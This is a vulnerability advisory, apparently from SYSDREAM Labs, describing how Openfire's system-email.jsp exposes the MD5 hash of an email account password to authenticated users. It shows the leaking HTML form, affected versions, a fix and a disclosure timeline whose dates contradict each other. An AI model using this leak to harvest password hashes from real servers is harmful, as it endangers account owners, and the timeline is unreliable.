+[comment]: https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:L/A:N/E:F/RL:O
+
+### Vulnerability Description
+
+A sensitive information disclosure vulnerabilty is present in the page *system-email.jsp*. It allow's an authenticated user to retreive the md5 hash the password of an email account.
+
+### Vulnerable code
+
+The following HTML code is reveived by an authenticated user on the page system-email.jsp. The md5 hash of the password is sent to the user.
+
+```
+<tr>
+    <td nowrap>
+        Server Username (Optional):
+    </td>
+    <td nowrap>
+        <input type="text" name="server_username" value="myusername" size="40" maxlength="150">
+    </td>
+</tr>
+<tr>
+    <td nowrap>
+        Server Password (Optional):
+    </td>
+    <td nowrap>
+        <input type="password" name="server_password" value="34819d7beeabb9260a5c854bc85b3e44" size="40" maxlength="150">
+    </td>
+</tr>
+```
+
+
+### Affected versions
+
+* Version >=3.10.2 and <4.0.2
+
+### Fixes
+
+* https://github.com/igniterealtime/Openfire/pull/570
+
+### Solution
+
+Update to version 4.0.2
+
+### Timeline (dd/mm/yyyy)
+
+* 15/10/2014 : Initial discovery
+* 19/10/2015 : Contact with vendor team
+* 27/11/2014 : vendor fixes vulnerabilities
+* 27/11/2014 : vendor releases version 4.0.2, which includes the fixes
+
+## Credits
+
+* Florian Nivette <f.nivette@...dream.com>
+
+
+
+
+-- 
+SYSDREAM Labs <labs@...dream.com>
+
+GPG :
+47D1 E124 C43E F992 2A2E
+1551 8EB4 8CD9 D5B2 59A1
+
+* Website: https://sysdream.com/
+* Twitter: @sysdream
+
+
+Download attachment "signature.asc" of type "application/pgp-signature" (820 bytes)
